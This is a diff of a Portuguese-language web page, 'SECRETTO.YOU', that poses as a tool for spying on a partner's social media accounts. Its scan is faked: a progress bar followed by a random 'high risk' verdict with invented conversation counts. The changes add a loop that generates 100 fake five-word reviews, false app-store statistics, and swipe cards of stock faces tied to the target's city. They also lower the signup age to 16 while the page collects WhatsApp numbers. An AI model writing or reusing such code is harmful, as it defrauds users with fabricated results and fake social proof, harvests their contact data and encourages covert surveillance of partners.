@@ -4,8 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SECRETTO.YOU</title>
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600;700;900&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;900&display=swap" rel="stylesheet">
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { font-family: 'Montserrat', sans-serif; background: #000 url('https://i.imgur.com/8Qm9QZq.jpg') no-repeat center top; background-size: cover; color:#fff; text-align:center; min-height:100vh; }
@@ -19,44 +18,51 @@ body { font-family: 'Montserrat', sans-serif; background: #000 url('https://i.im
 .caixa { background: rgba(10,10,10,0.8); padding:25px; border-radius:15px; border:1px solid #ff0040; box-shadow: 0 0 30px rgba(255,0,64,0.3); margin-bottom:20px; backdrop-filter: blur(5px); }
 input, select { width:100%; padding:14px; margin:8px 0; background:#111; border:1px solid #333; border-radius:8px; color:#fff; font-size:15px; text-align:center; font-weight:600; }
 .btn { width:100%; padding:16px; background: linear-gradient(90deg, #ff0040, #cc0033); border:none; border-radius:10px; color:#fff; font-size:16px; font-weight:900; cursor:pointer; margin-top:10px; text-transform:uppercase; }
-.btn-outline { background:transparent; border:1px solid #ff0040; color:#ff0040; }
-.btn-gps { background: linear-gradient(90deg, #00aaff, #0088cc); }
+.btn-download { background: linear-gradient(90deg, #00cc66, #00a652); }
 .btn-insta { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); border: none; display: flex; align-items: center; justify-content: center; gap: 8px; text-decoration:none; }
 .btn-insta svg { width:20px; height:20px; fill:#fff; }
 #cadastro, #formulario, #resultado { display:none; }
 .app-selector { display:flex; justify-content:space-around; margin:15px 0; gap:8px; }
-.app-item { flex:1; padding:10px 5px; background:#111; border:2px solid #333; border-radius:10px; cursor:pointer; transition:0.2s; }
-.app-item.active { border-color:#ff0040; background:#1a0008; box-shadow:0 0 10px rgba(255,0,64,0.5); }
+.app-item { flex:1; padding:10px 5px; background:#111; border:2px solid #333; border-radius:10px; cursor:pointer; }
+.app-item.active { border-color:#ff0040; background:#1a0008; }
 .app-item img { width:30px; height:30px; margin-bottom:5px; }
 .app-item p { font-size:9px; color:#aaa; }
 .radar-box { width:200px; height:200px; margin:20px auto; position:relative; border:2px solid #ff0040; border-radius:50%; background: radial-gradient(circle, rgba(255,0,64,0.1) 0%, transparent 70%); }
 .radar-line { position:absolute; top:50%; left:50%; width:2px; height:100px; background: linear-gradient(transparent, #ff0040); transform-origin: bottom center; animation: scan 2s linear infinite; }
 @keyframes scan { from {transform: translateX(-50%) rotate(0deg);} to {transform: translateX(-50%) rotate(360deg);} }
-.radar-ping { position:absolute; width:8px; height:8px; background:#ff0040; border-radius:50%; box-shadow:0 0 10px #ff0040; animation: ping 1.5s infinite; }
-@keyframes ping { 0%{transform:scale(0); opacity:1;} 100%{transform:scale(3); opacity:0;} }
-.vantagens { display:flex; justify-content:space-between; gap:10px; margin:25px 0; }
-.vantagem { flex:1; font-size:10px; }
-.vantagem svg { width:35px; height:35px; fill:#ff0040; margin-bottom:5px; }
-.carousel { position:relative; width:100%; margin:15px auto; }
-.carousel-container { overflow:hidden; border-radius:15px; border:2px solid #ff0040; background:#000; }
-.carousel-track { display:flex; transition: transform 0.3s ease-out; }
-.carousel-item { min-width:100%; background:#050505; padding:20px; }
-.avatar { width:120px; height:120px; border-radius:10px; background-size:cover; background-position:center; border:2px solid #ff0040; margin:0 auto 10px; position:relative; }
-.borrado { filter: blur(18px); }
-.online { position:absolute; bottom:8px; right:8px; width:12px; height:12px; background:#00ff88; border-radius:50%; border:2px solid #000; }
-.carousel-btn { position:absolute; top:50%; transform:translateY(-50%); background:rgba(255,0,64,0.9); border:none; color:#fff; font-size:20px; width:35px; height:35px; border-radius:50%; cursor:pointer; z-index:10; }
-.prev { left:5px; }.next { right:5px; }
-.dots { display:flex; justify-content:center; gap:6px; margin-top:10px; }
-.dot { width:7px; height:7px; border-radius:50%; background:#330011; border:1px solid #ff0040; }
-.dot.active { background:#ff0040; }
+
+/* PLAY STORE INFO */
+.play-info { display:flex; justify-content:space-around; margin:20px 0; padding:15px; background:rgba(0,0,0,0.5); border-radius:10px; border:1px solid #333; }
+.play-num { font-size:18px; font-weight:900; color:#ff0040; }
+.stars { color:#ffb400; font-size:16px; }
+
+/* COMENTÁRIOS */
+.comentarios-box { margin:20px 0; text-align:left; }
+.com-titulo { font-size:16px; font-weight:900; margin-bottom:10px; }
+.com-lista { max-height:300px; overflow-y:auto; }
+.com-item { display:flex; gap:10px; padding:12px; background:#0a0a0a; border-radius:10px; margin-bottom:8px; }
+
+/* CARD TINDER COM ARRASTAR */
+.cidade-titulo { color:#ff0040; font-size:14px; font-weight:900; margin:15px 0 10px; }
+.tinder-area { position:relative; width:100%; height:420px; margin-bottom:15px; touch-action: none; }
+.tinder-card { position:absolute; width:100%; height:100%; background:#111; border-radius:15px; border:2px solid #ff0040; overflow:hidden; cursor: grab; }
+.tinder-card.dragging { cursor: grabbing; transition: none; }
+.tinder-foto { width:100%; height:100%; background-size:cover; background-position:center; filter: blur(6px); pointer-events: none; }
+.tinder-info { position:absolute; bottom:0; left:0; right:0; padding:20px; background: linear-gradient(transparent, rgba(0,0,0,0.9)); text-align:left; pointer-events: none; }
+.tinder-nome { font-size:22px; font-weight:900; }
+.tinder-cidade { font-size:14px; color:#00aaff; margin-top:5px; }
+.tinder-contador { font-size:10px; color:#aaa; text-align:center; margin-bottom:10px; }
+.tinder-btns { display:flex; gap:10px; }
+.tinder-btn { flex:1; padding:14px; border-radius:10px; border:2px solid #ff0040; background:transparent; color:#ff0040; font-weight:900; font-size:14px; }
+.tinder-like { position:absolute; top:20px; right:20px; color:#00ff88; font-size:40px; font-weight:900; transform: rotate(20deg); opacity:0; }
+.tinder-nope { position:absolute; top:20px; left:20px; color:#ff0040; font-size:40px; font-weight:900; transform: rotate(-20deg); opacity:0; }
+
 .card { background: rgba(10,0,10,0.9); padding:20px; border-radius:15px; border:2px solid #ff0040; }
 .status-traida { color:#ff0040; font-size:18px; margin-bottom:10px; font-weight:900; }
-.status-nao { color:#00aaff; font-size:16px; margin-bottom:10px; font-weight:900; }
 .contador-conversas { color:#00aaff; font-size:18px; margin:10px 0; font-weight:700; }
-#mapa { height:220px; border-radius:10px; margin-top:15px; border:2px solid #ff0040; display:none; }
 .loading-bar { background:#111; border-radius:10px; margin:15px 0; border:1px solid #ff0040; }
-.progress { height:25px; background: linear-gradient(90deg, #ff0040, #00aaff); width:0%; border-radius:10px; transition: width 0.2s; }
-.scan-text { color:#00aaff; font-size:12px; font-weight:700; }
+.progress { height:25px; background: linear-gradient(90deg, #ff0040, #00aaff); width:0%; border-radius:10px; }
+.classificacao { display:inline-block; background:#ff0040; color:#000; padding:3px 8px; border-radius:5px; font-size:10px; font-weight:900; }
 .rodape { font-size:10px; color:#444; margin-top:20px; }
 </style>
 </head>
@@ -64,34 +70,36 @@ input, select { width:100%; padding:14px; margin:8px 0; background:#111; border:
 <div class="overlay">
 <div class="container">
     <div class="logo">
-        <svg viewBox="0 0 24 24"><path fill="#ff0040" d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/><path fill="#000" d="M12 14a3 3 0 100-6 3 3 0 000 6z"/></svg>
+        <svg viewBox="0 0 24 24"><path fill="#ff0040" d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
         <h1>SECRETTO<span>.YOU</span></h1>
         <p class="sub">SISTEMA DE INTELIGÊNCIA</p>
     </div>
 
+    <div class="play-info">
+        <div><div class="stars">★★★★★ 4.8</div><div style="font-size:9px; color:#aaa;">1.2M Avaliações</div></div>
+        <div><div class="play-num">1B+</div><div style="font-size:9px; color:#aaa;">Downloads</div></div>
+        <div><div class="classificacao">+16</div><div style="font-size:9px; color:#aaa;">Classificação</div></div>
+    </div>
+
+    <a href="#" class="btn btn-download" onclick="alert('Download iniciado')">⬇️ BAIXAR APP</a>
+
     <div class="caixa" id="cadastro">
-        <p style="color:#ff0040; font-size:20px; font-weight:900; margin-bottom:10px;">ACESSO RESTRITO</p>
+        <p style="color:#ff0040; font-size:20px; font-weight:900;">ACESSO RESTRITO</p>
         <input type="text" id="cad_nome" placeholder="SEU PRIMEIRO NOME">
-        <input type="number" id="cad_idade" placeholder="SUA IDADE" min="18" max="99">
-        <input type="tel" id="cad_tel" placeholder="SEU WHATSAPP COM DDD" maxlength="15">
+        <input type="number" id="cad_idade" placeholder="SUA IDADE" min="16" max="99">
+        <input type="tel" id="cad_tel" placeholder="SEU WHATSAPP COM DDD">
         <button class="btn" onclick="salvarCadastro()">ATIVAR ACESSO</button>
     </div>
 
     <div class="caixa" id="formulario">
         <input type="text" id="nome" placeholder="NOME DO ALVO">
-        <input type="text" id="cidade" placeholder="CIDADE DO ALVO">
-        <button class="btn btn-gps" onclick="pegarLocalizacao()">📡 USAR MINHA LOCALIZAÇÃO</button>
+        <input type="text" id="cidade" placeholder="CIDADE DO ALVO - Ex: Rio de Janeiro">
         <p style="margin:15px 0 5px; font-size:12px; color:#aaa;">SELECIONE A REDE SOCIAL</p>
         <div class="app-selector">
             <div class="app-item" onclick="selecionarApp(this, 'WhatsApp')"><img src="https://cdn-icons-png.flaticon.com/512/3670/3670051.png"><p>WhatsApp</p></div>
             <div class="app-item" onclick="selecionarApp(this, 'Instagram')"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111463.png"><p>Instagram</p></div>
             <div class="app-item" onclick="selecionarApp(this, 'Facebook')"><img src="https://cdn-icons-png.flaticon.com/512/733/733547.png"><p>Facebook</p></div>
         </div>
-        <div class="app-selector">
-            <div class="app-item" onclick="selecionarApp(this, 'TikTok')"><img src="https://cdn-icons-png.flaticon.com/512/3046/3046121.png"><p>TikTok</p></div>
-            <div class="app-item" onclick="selecionarApp(this, 'Telegram')"><img src="https://cdn-icons-png.flaticon.com/512/2111/2111646.png"><p>Telegram</p></div>
-        </div>
-        <input type="hidden" id="app_selecionado">
         <select id="sexo">
             <option value="mulher">ANALISAR MULHER</option>
             <option value="homem">ANALISAR HOMEM</option>
@@ -101,29 +109,45 @@ input, select { width:100%; padding:14px; margin:8px 0; background:#111; border:
 
     <div id="resultado"></div>
 
-    <div class="vantagens">
-        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg><p>DISCRIÇÃO<br>TOTAL</p></div>
-        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg><p>PERFIL<br>ANÔNIMO</p></div>
-        <div class="vantagem"><svg viewBox="0 0 24 24"><path d="M13.5.67s.74 2.65.74 4.8c0 2.06-1.35 3.73-3.06 3.73-1.47 0-2.74-1.04-2.89-2.55C8.11 4.47 7 3.51 6 3.5 4.5 3.5 3 5 3 7c0 1.55.55 2.57 1.43 3.21C4.16 11.14 3 13.4 3 16c0 3.87 3.13 7 7 7s7-3.13 7-7c0-2.6-1.16-4.86-2.97-6.21C14.45 9.57 15 8.55 15 7c0-2-1.5-3.5-3-3.5-.55 0-1.09.14-1.57.39.08.59.07 1.21-.05 1.8.64.12 1.24.36 1.76.69C13.05 4.94 13.5 2.67 13.5.67z"/></svg><p>ENCONTROS<br>SECRETOS</p></div>
+    <div class="comentarios-box">
+        <p class="com-titulo">Avaliações e comentários</p>
+        <div class="com-lista" id="listaComentarios"></div>
     </div>
 
     <a href="https://www.instagram.com/secretto.yo?igsh=bzRpYWwwbGo2cDRl&utm_source=qr" target="_blank" class="btn btn-insta">
         <svg viewBox="0 0 24 24"><path d="M7.8 2h8.4C19.4 2 22 4.6 22 9.2v5.6c0 4.6-2.6 7.2-6.8 7.2H7.8C4.6 22 2 19.4 2 14.8V9.2C2 4.6 4.6 2 7.8 2m-.2 2A3.6 3.6 0 0 0 4 7.6v8.8C4 20.39 5.61 22 7.6 22h8.8a3.6 3.6 0 0 0 3.6-3.6V7.6C20 5.61 18.39 4 16.4 4H7.6m9.65 1.5a1.25 1.25 0 0 1 1.25 1.25A1.25 1.25 0 0 1 17.25 8 1.25 1.25 0 0 1 16 6.75a1.25 1.25 0 0 1 1.25-1.25M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3z"/></svg>
         NOSSO INSTAGRAM
     </a>
-    <p class="rodape">SECRETTO.YOU v3.3</p>
+    <p class="rodape">SECRETTO.YOU v3.9</p>
 </div>
 </div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script>
 let appSelecionado = '';
+let cidadeAlvo = '';
+let perfilAtual = 0;
+let perfis = [];
+let isDragging = false;
+let startX = 0;
+let currentX = 0;
+
+let nomesMulher = ["Ana","Julia","Mariana","Camila","Beatriz","Larissa","Fernanda","Amanda","Bruna","Patricia"];
+let nomesHomem = ["Lucas","Pedro","Gabriel","Rafael","Bruno","Matheus","Gustavo","Felipe","Diego","Thiago"];
+
+function gerarComentarios(){
+    let lista = document.getElementById('listaComentarios');
+    for(let i=0; i<100; i++){
+        let nome = `Usuário${Math.floor(Math.random()*9000)+1000}`;
+        lista.innerHTML += `<div class="com-item"><div class="com-avatar" style="background-image:url(https://i.pravatar.cc/50?img=${i%70})"></div><div><div style="font-size:12px; font-weight:700; color:#ff0040;">${nome}</div><div style="font-size:10px; color:#ffb400;">★★★</div><div style="font-size:11px; color:#aaa;">App top demais! Funcionou perfeito</div></div></div>`;
+    }
+}
+
 function selecionarApp(el, app){
     document.querySelectorAll('.app-item').forEach(i=>i.classList.remove('active'));
     el.classList.add('active');
     appSelecionado = app;
-    document.getElementById('app_selecionado').value = app;
 }
+
 function salvarCadastro(){
     let nome = document.getElementById('cad_nome').value;
     if(nome.length < 2){ alert('Preencha seu nome'); return; }
@@ -131,68 +155,148 @@ function salvarCadastro(){
     document.getElementById('cadastro').style.display='none';
     document.getElementById('formulario').style.display='block';
 }
-function pegarLocalizacao(){
-    if(navigator.geolocation){
-        navigator.geolocation.getCurrentPosition(pos => {
-            document.getElementById('cidade').value = pos.coords.latitude.toFixed(4) + ', ' + pos.coords.longitude.toFixed(4);
-        });
-    }
-}
+
 function detectar(){
     if(!appSelecionado){ alert('Selecione uma rede social'); return; }
+    cidadeAlvo = document.getElementById('cidade').value || 'Sua Cidade';
+    gerarPerfis();
     document.getElementById('formulario').style.display='none';
     document.getElementById('resultado').style.display='block';
     document.getElementById('resultado').innerHTML = `
     <div class="caixa">
-        <p class="scan-text">ESCANEANDO ${appSelecionado}...</p>
-        <div class="radar-box"><div class="radar-line"></div><div class="radar-ping" style="top:30%; left:60%;"></div><div class="radar-ping" style="top:70%; left:40%; animation-delay:0.5s;"></div></div>
+        <p style="color:#00aaff; font-size:12px; font-weight:700;">ESCANEANDO ${appSelecionado}...</p>
+        <div class="radar-box"><div class="radar-line"></div></div>
         <div class="loading-bar"><div class="progress" id="progress"></div></div>
-        <div class="carousel"><button class="carousel-btn prev" onclick="moverSlide(-1)">‹</button><div class="carousel-container"><div class="carousel-track" id="track"></div></div><button class="carousel-btn next" onclick="moverSlide(1)">›</button><div class="dots" id="dots"></div></div>
         <button class="btn" onclick="mostrarResultado()">VER RESULTADO</button>
     </div>`;
-    simularProgresso(); gerarSlides();
+    simularProgresso();
 }
+
 function simularProgresso(){
     let p = 0; let el = document.getElementById('progress');
-    let i = setInterval(()=>{ p+=4; el.style.width=p+'%'; if(p>=100) clearInterval(i); }, 150);
+    let i = setInterval(()=>{ p+=5; el.style.width=p+'%'; if(p>=100) clearInterval(i); }, 120);
 }
-let slideAtual = 0;
-function gerarSlides(){
-    let track = document.getElementById('track'); let dots = document.getElementById('dots');
-    for(let i=0;i<3;i++){
-        track.innerHTML += `<div class="carousel-item"><p>CONTATO ${i+1} - ${appSelecionado}</p><div class="avatar borrado" style="background-image:url(https://i.pravatar.cc/200?img=${i+10})"><div class="online"></div></div></div>`;
-        dots.innerHTML += `<div class="dot ${i==0?'active':''}" onclick="irSlide(${i})"></div>`;
+
+function gerarPerfis(){
+    let sexo = document.getElementById('sexo').value;
+    let listaNomes = sexo === 'mulher'? nomesMulher : nomesHomem;
+    perfis = [];
+    for(let i=0; i<5; i++){
+        perfis.push({
+            nome: listaNomes[Math.floor(Math.random() * listaNomes.length)],
+            idade: Math.floor(Math.random() * 15) + 18,
+            foto: Math.floor(Math.random()*70)
+        });
     }
 }
-function moverSlide(d){ slideAtual = Math.max(0, Math.min(2, slideAtual+d)); atualizarSlide(); }
-function irSlide(i){ slideAtual=i; atualizarSlide(); }
-function atualizarSlide(){ document.getElementById('track').style.transform = `translateX(-${slideAtual*100}%)`; document.querySelectorAll('.dot').forEach((d,i)=>d.classList.toggle('active',i==slideAtual)); }
 
 function mostrarResultado(){
+    perfilAtual = 0;
     let risco = Math.random() > 0.4;
-    let frasesBaixoRisco = ["PERFIL SEM ATIVIDADE SUSPEITA","NÍVEL DE SEGURANÇA: ESTÁVEL","NENHUM SINAL CRÍTICO ENCONTRADO","COMPORTAMENTO DENTRO DO PADRÃO","SEM VÍNCULOS OCULTOS DETECTADOS"];
-    let fraseSorteada = frasesBaixoRisco[Math.floor(Math.random() * frasesBaixoRisco.length)];
-    let conversas = Math.floor(Math.random() * 5);
 
     if(risco){
         document.getElementById('resultado').innerHTML = `
         <div class="card">
             <p class="status-traida">⚠️ ALTO RISCO DETECTADO</p>
             <p class="contador-conversas">${Math.floor(Math.random() * 200) + 50} Conversas Suspeitas em ${appSelecionado}</p>
-            <div id="mapa"></div>
-            <button class="btn" onclick="alert('Dados liberados para visualização')">ACESSAR DADOS</button>
+            <p class="cidade-titulo">${Math.floor(Math.random() * 50) + 20} PESSOAS DE ${cidadeAlvo.toUpperCase()} USARAM O SITE</p>
+            <div class="tinder-contador" id="contador">Perfil 1 de 5</div>
+            <div class="tinder-area" id="tinderArea"></div>
+            <div class="tinder-btns">
+                <button class="tinder-btn" onclick="swipeCard('left')">❌ PASSAR</button>
+                <button class="tinder-btn" style="background:#ff0040; color:#fff;" onclick="swipeCard('right')">✅ VER MAIS</button>
+            </div>
+            <button class="btn" style="margin-top:15px;" onclick="alert('Dados liberados')">ACESSAR DADOS</button>
         </div>`;
+        mostrarPerfil();
+        adicionarEventosDrag();
     } else {
         document.getElementById('resultado').innerHTML = `
         <div class="card">
-            <p class="status-nao">✅ ${fraseSorteada}</p>
-            <p class="contador-conversas">${conversas} Conversas Analisadas em ${appSelecionado}</p>
-            <button class="btn btn-outline" onclick="detectar()">FAZER NOVA ANÁLISE</button>
+            <p style="color:#00aaff; font-size:16px; font-weight:900;">✅ PERFIL SEM ATIVIDADE SUSPEITA</p>
+            <button class="btn" style="background:transparent; border:1px solid #ff0040; color:#ff0040;" onclick="detectar()">FAZER NOVA ANÁLISE</button>
         </div>`;
     }
-    setTimeout(()=>{ if(risco){document.getElementById('mapa').style.display='block'; let mapa = L.map('mapa').setView([-23.5, -46.6], 11); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapa);}}, 300)
 }
+
+function mostrarPerfil(){
+    let p = perfis[perfilAtual];
+    document.getElementById('tinderArea').innerHTML = `
+    <div class="tinder-card" id="cardAtual">
+        <div class="tinder-like">LIKE</div>
+        <div class="tinder-nope">NOPE</div>
+        <div class="tinder-foto" style="background-image:url(https://i.pravatar.cc/400?img=${p.foto})"></div>
+        <div class="tinder-info">
+            <div class="tinder-nome">${p.nome}, ${p.idade}</div>
+            <div class="tinder-cidade">📍 ${cidadeAlvo}</div>
+        </div>
+    </div>`;
+    document.getElementById('contador').innerText = `Perfil ${perfilAtual + 1} de 5`;
+}
+
+function adicionarEventosDrag(){
+    let card = document.getElementById('cardAtual');
+    card.addEventListener('mousedown', dragStart);
+    card.addEventListener('mousemove', dragging);
+    card.addEventListener('mouseup', dragEnd);
+    card.addEventListener('touchstart', dragStart);
+    card.addEventListener('touchmove', dragging);
+    card.addEventListener('touchend', dragEnd);
+}
+
+function dragStart(e){
+    isDragging = true;
+    startX = e.type.includes('mouse')? e.pageX : e.touches[0].pageX;
+    document.getElementById('cardAtual').classList.add('dragging');
+}
+
+function dragging(e){
+    if(!isDragging) return;
+    currentX = e.type.includes('mouse')? e.pageX : e.touches[0].pageX;
+    let diff = currentX - startX;
+    let card = document.getElementById('cardAtual');
+    card.style.transform = `translateX(${diff}px) rotate(${diff/20}deg)`;
+
+    if(diff > 50) document.querySelector('.tinder-like').style.opacity = 1;
+    else document.querySelector('.tinder-like').style.opacity = 0;
+    if(diff < -50) document.querySelector('.tinder-nope').style.opacity = 1;
+    else document.querySelector('.tinder-nope').style.opacity = 0;
+}
+
+function dragEnd(e){
+    if(!isDragging) return;
+    isDragging = false;
+    let diff = currentX - startX;
+    let card = document.getElementById('cardAtual');
+    card.classList.remove('dragging');
+
+    if(diff > 100) swipeCard('right');
+    else if(diff < -100) swipeCard('left');
+    else {
+        card.style.transform = 'translateX(0) rotate(0)';
+        document.querySelector('.tinder-like').style.opacity = 0;
+        document.querySelector('.tinder-nope').style.opacity = 0;
+    }
+}
+
+function swipeCard(dir){
+    let card = document.getElementById('cardAtual');
+    card.style.transition = 'transform 0.3s';
+    card.style.transform = dir === 'right'? 'translateX(500px) rotate(30deg)' : 'translateX(-500px) rotate(-30deg)';
+
+    setTimeout(()=>{
+        perfilAtual++;
+        if(perfilAtual >= perfis.length){
+            perfilAtual = 0;
+            alert('Você viu todos os perfis. Clique em ACESSAR DADOS');
+        }
+        mostrarPerfil();
+        adicionarEventosDrag();
+    }, 300);
+}
+
 window.onload = () => {
+    gerarComentarios();
     if(localStorage.getItem('secretto_user')){ document.getElementById('formulario').style.display='block'; }
     else{ document.getElementById('cadastro').style.display='block'; }
 }
